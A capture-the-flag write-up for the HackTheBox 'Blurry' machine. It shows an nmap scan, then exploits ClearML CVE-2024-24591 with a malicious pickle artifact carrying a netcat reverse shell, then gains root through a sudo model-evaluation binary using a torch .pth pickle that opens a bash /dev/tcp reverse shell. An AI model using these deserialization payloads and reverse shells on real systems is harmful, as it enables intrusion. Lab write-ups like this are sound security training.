+++
title = "HTB - Blurry"
date = 2024-10-09
+++

### Scan
```
┌──(root㉿kali)-[/home/li0t]
└─# nmap -sVC -p- --open 10.10.11.19
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-09 08:57 EDT
Nmap scan report for 10.10.11.19
Host is up (0.12s latency).
Not shown: 64850 closed tcp ports (reset), 683 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://app.blurry.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.26 seconds

```
### Enum
We get a redirect, so lets update our `/etc/hosts`
We brute subdomains and web directories, yielding this:<img alt="Image" async src="images/Screenshot 2024-10-09 at 1.09.59 PM.png" width="800px"></img>
Also this:<img alt="Image" async src="images/Screenshot 2024-10-09 at 1.33.09 PM.png" width="800px"></img>
Add everything to `/etc/hosts`
Visiting the link, we get a portal. Creating a user gives us access. ClearML is AI software. Rooting around tells us 1.13.1
CVE-2024-24591 <img alt="Image" async src="images/Screenshot 2024-10-09 at 1.15.38 PM.png" width="800px"></img>
Great explanation here: https://hiddenlayer.com/research/not-so-clear-how-mlops-solutions-can-muddy-the-waters-of-your-supply-chain/
We'll need to install clearml with `pip install clearml`
Then, for configuration purposes, create new credentials on the site via settings, and paste into the terminal when prompted.<img alt="Image" async src="images/Screenshot 2024-10-09 at 1.34.13 PM.png" width="800px"></img>
Now, we can move on to the python script in order to plant a malicious files on the user via the poisoned dataset with dir traversal
Code meandering we stumble on 'Black Swan', and we can see that it is a script tasked with processing JSON artifacts. We can abuse this functionality by uploading our pickle file and passing it through this function for arbitrary code execution.
```
import pickle  
import os  
from clearml import Task, Logger  
  
  
task = Task.init(project_name='Black Swan', task_name='REV shell', tags=["review"])  
  
  
  
class MaliciousCode:  
    def __reduce__(self):  
  
        cmd = (  
            "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker-ip attacker-port > /tmp/f"  
        )  
        return (os.system, (cmd,))  
  
  
malicious_object = MaliciousCode()  
pickle_filename = 'malicious_pickle.pkl'  
with open(pickle_filename, 'wb') as f:  
    pickle.dump(malicious_object, f)  
  
print("Malicious pickle file with reverse shell created.")  
  
  
task.upload_artifact(name='malicious_pickle', artifact_object=malicious_object, retries=2, wait_on_upload=True, extension_name=".pkl")  
  
print("Malicious pickle file uploaded as artifact.")
```
Run it <img alt="Image" async src="images/Screenshot 2024-10-09 at 1.54.22 PM.png" width="800px"></img>
Shell as jippity! Stabilize shell
sudo -l <img alt="Image" async src="images/Screenshot 2024-10-09 at 1.56.37 PM.png" width="800px"></img>
we'll play with that in a second. First, grab user flag, and notice ssh private key!
user:3f27bf4798adad24993c80ea10ec74d9
create file and chmod 400 to ssh back in
`vim rsa.key` paste. Make sure to include begin and end part
`chmod 400 rsa.key`
`ssh -i rsa.key jippity@10.10.11.19`
<img alt="Image" async src="images/Screenshot 2024-10-09 at 2.03.39 PM.png" width="800px"></img>
### Priv esc
remember the nopasswd? here we go. 
Lets create a py script that drops a malicious pth file so taht we can eecute
`vim evilpath.py` and use
```
import torch
import os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.11/9001 0>&1'",))

evil = Payload()
torch.save(evil, 'evil.pth')
```

then to run, `python3 evilpath.py` followed by `cp evil.pth /models && sudo /usr/bin/evaluate_model /models/evil.pth`. It should hang

Your listener set at 9001 should catch the root shell!

Root:45ab0078950cb8dbd2d3ea188f62f389

GET INTO THE WEEDS WRITING THIS MF. alal of em for that matter

